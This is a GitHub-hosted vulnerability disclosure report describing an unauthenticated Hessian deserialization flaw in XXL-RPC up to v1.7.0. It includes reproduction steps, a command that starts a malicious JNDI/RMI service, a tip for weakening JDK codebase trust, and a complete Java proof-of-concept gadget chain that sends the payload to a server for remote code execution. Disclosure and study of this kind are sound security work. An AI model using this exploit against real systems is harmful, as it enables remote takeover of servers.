=== Content from github.com_c5dba299_20250115_093724.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fedirc-wong%2Frecord%2Fblob%2Fmain%2Fdeserialization_vulnerability_report.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fedirc-wong%2Frecord%2Fblob%2Fmain%2Fdeserialization_vulnerability_report.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=edirc-wong%2Frecord)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[edirc-wong](/edirc-wong)
/
**[record](/edirc-wong/record)**
Public

* [Notifications](/login?return_to=%2Fedirc-wong%2Frecord) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fedirc-wong%2Frecord)
* [Star
   2](/login?return_to=%2Fedirc-wong%2Frecord)

* [Code](/edirc-wong/record)
* [Issues
  0](/edirc-wong/record/issues)
* [Pull requests
  0](/edirc-wong/record/pulls)
* [Actions](/edirc-wong/record/actions)
* [Projects
  0](/edirc-wong/record/projects)
* [Security](/edirc-wong/record/security)
* [Insights](/edirc-wong/record/pulse)

Additional navigation options

* [Code](/edirc-wong/record)
* [Issues](/edirc-wong/record/issues)
* [Pull requests](/edirc-wong/record/pulls)
* [Actions](/edirc-wong/record/actions)
* [Projects](/edirc-wong/record/projects)
* [Security](/edirc-wong/record/security)
* [Insights](/edirc-wong/record/pulse)

## Files

 main
## Breadcrumbs

1. [record](/edirc-wong/record/tree/main)
/
# deserialization\_vulnerability\_report.md

Copy path Blame  Blame
## Latest commit

## History

[History](/edirc-wong/record/commits/main/deserialization_vulnerability_report.md)executable file·149 lines (86 loc) · 5.97 KB main
## Breadcrumbs

1. [record](/edirc-wong/record/tree/main)
/
# deserialization\_vulnerability\_report.md

Top
## File metadata and controls

* Preview
* Code
* Blame

executable file·149 lines (86 loc) · 5.97 KB[Raw](https://github.com/edirc-wong/record/raw/refs/heads/main/deserialization_vulnerability_report.md)
# XXL-RPC deserialization vulnerability

### Brief description

The xxl-rpc framework utilizes the latest version(4.0.66) of the Hessian to facilitate serialization and deserialization during remote communication processes.

Through code auditing, it is easily discovered that there is a developer-encapsulated serialization processor (currently supporting both Hessian1 and Hessian2 protocols) within the `com.xxl.rpc.core.old.serializ` package of the `xxl-rpc-core` module. During runtime, the server and client will invoke the pre-configured serialization processor for deserialization in the `com.xxl.rpc.core.remoting.net.impl.netty.codec.NettyDecode#decode` method. We found that this method deserialize the inputs without validating, which results in vulnerability.

### Affected versions

```
<= v1.7.0

```

The following uses the latest v1.7.0 as an example to illustrate the attack.

### How to reproduce

Utilize the official source code of xxl-rpc and the `xxl-rpc-samples/xxl-rpc-sample-springboot` provided in the usage examples.

### 1. Starting xxl-rpc server

a. Create necessary directories and files and modify configuration files

[![image-20230507103420819](/edirc-wong/record/raw/main/asset/image-20230507103420819.png)](/edirc-wong/record/blob/main/asset/image-20230507103420819.png)

Modify the "value" in the second red box to the absolute path of the log file for the newly created client on your local machine.

[![image-20230507103510608](/edirc-wong/record/raw/main/asset/image-20230507103510608.png)](/edirc-wong/record/blob/main/asset/image-20230507103510608.png)

As above, modify the value in the second red box to the absolute path of the registry data for the newly created local registry on your machine.

And the other configurations needed to edit are as below:

[![image-20230507103647266](/edirc-wong/record/raw/main/asset/image-20230507103647266.png)](/edirc-wong/record/blob/main/asset/image-20230507103647266.png)

[![image-20230507103703722](/edirc-wong/record/raw/main/asset/image-20230507103703722.png)](/edirc-wong/record/blob/main/asset/image-20230507103703722.png)

Make sure all of these file are created after editing.

b. Configure the MySQL service locally and import the official database (optional. if an error occurs, maybe you should do this)

I am using Parallels virtual machine locally and have configured [PHPStudy](https://www.xp.cn/) inside it. You can find MySQL is integrated in it (You can also install an MySQL on your local machine).

[![image-20230507105205450](/edirc-wong/record/raw/main/asset/image-20230507105205450.png)](/edirc-wong/record/blob/main/asset/image-20230507105205450.png)

find tables\_xxl\_rpc.sql:

[![image-20230507105219694](/edirc-wong/record/raw/main/asset/image-20230507105219694.png)](/edirc-wong/record/blob/main/asset/image-20230507105219694.png)

put it on a suitable location and then login to MySQL using the command line, then use the "source" command to import the database:

[![image-20230507104306737](/edirc-wong/record/raw/main/asset/image-20230507104306737.png)](/edirc-wong/record/blob/main/asset/image-20230507104306737.png)

After that, you should modify the configuration information for the database.

[![image-20230507104341653](/edirc-wong/record/raw/main/asset/image-20230507104341653.png)](/edirc-wong/record/blob/main/asset/image-20230507104341653.png)

(2) Start Zookeeper and xxl-rpc-sample-springboot-server

For this test, jdk8u92 is chosen. If the jdk version is higher, there may be restrictions on JNDI injection. Of course, there are also ways to bypass this restriction for higher versions. However, to facilitate the reproduction and testing of this vulnerability, for higher versions of jdk, a statement can be added before starting the server of the test:`System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");`

you need to download the [zookeeper](https://zookeeper.apache.org/releases.html) and start it by running ``

[![image-20230507105718737](/edirc-wong/record/raw/main/asset/image-20230507105718737.png)](/edirc-wong/record/blob/main/asset/image-20230507105718737.png)

the opened server is as below (the 405 error can be ingored):

[![image-20230507104549725](/edirc-wong/record/raw/main/asset/image-20230507104549725.png)](/edirc-wong/record/blob/main/asset/image-20230507104549725.png)

### 2 Attacker environment setup and launch the attack

(1) Run malicious RMI service
Execute the command `java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open -a /System/Applications/Calculator.app` to run the malicious RMI service. If your OS is Windows, you should modify the shell command to `cmd /c calc.exe`. Successful execution of the command produces the following effect:

[![image-20230507105005771](/edirc-wong/record/raw/main/asset/image-20230507105005771.png)](/edirc-wong/record/blob/main/asset/image-20230507105005771.png)

(2) Unzip xxl-sendEvil.zip and open it with IDEA (or other IDE).
Modify the RUL in PoC2.java to the URL corresponding to the malicious RMI service started in the previous step.

Running PoC2.java will demonstrate the attack effect.

### POC

```
package com.xxl.rpc.core.poc;

import com.xxl.rpc.serialize.HessianSerializer;
import com.xxl.rpc.serialize.Serializer;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.beans.factory.BeanFactory;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

import java.io.OutputStream;
import java.net.Socket;

public class PoC2 {

    public static void main(String[] args) throws Exception {

      // Remember to modify the RMI URL
        BeanFactory bf =  SpringUtil.makeJNDITrigger("rmi://192.168.31.5:1099/vorbxa");
        DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();
        pcadv.setBeanFactory(bf);
        pcadv.setAdviceBeanName("rmi://192.168.31.5:1099/vorbxa");

        DefaultBeanFactoryPointcutAdvisor pcadv2 = new DefaultBeanFactoryPointcutAdvisor();
        pcadv2.setAdviceBeanName("rmi://192.168.31.5:1099/vorbxa");
        Object obj = JDKUtil.makeMap(pcadv2, pcadv);

        HessianSerializer serializer = new HessianSerializer();
        byte[] bytes = serializer.serialize(obj);
        // serializer.deserialize(bytes, null);

        int length = bytes.length;
        byte[] newArray = new byte[length + 4];
        newArray[0] = (byte) ((length >> 24) & 0xFF);
        newArray[1] = (byte) ((length >> 16) & 0xFF);
        newArray[2] = (byte) ((length >> 8) & 0xFF);
        newArray[3] = (byte) (length & 0xFF);
        System.arraycopy(bytes, 0, newArray, 4, length);
        Socket socket = new Socket("127.0.0.1", 7080);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(newArray);
        outputStream.flush();
        outputStream.close();

    }

}
```

### **Vulnerability Impact**

This attack can cause remote arbitrary code execution

### **Display of attack results(Remote Code Execute)**

[![image-20230507105047640](/edirc-wong/record/raw/main/asset/image-20230507105047640.png)](/edirc-wong/record/blob/main/asset/image-20230507105047640.png)

[![image-20230507105101166](/edirc-wong/record/raw/main/asset/image-20230507105101166.png)](/edirc-wong/record/blob/main/asset/image-20230507105101166.png)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


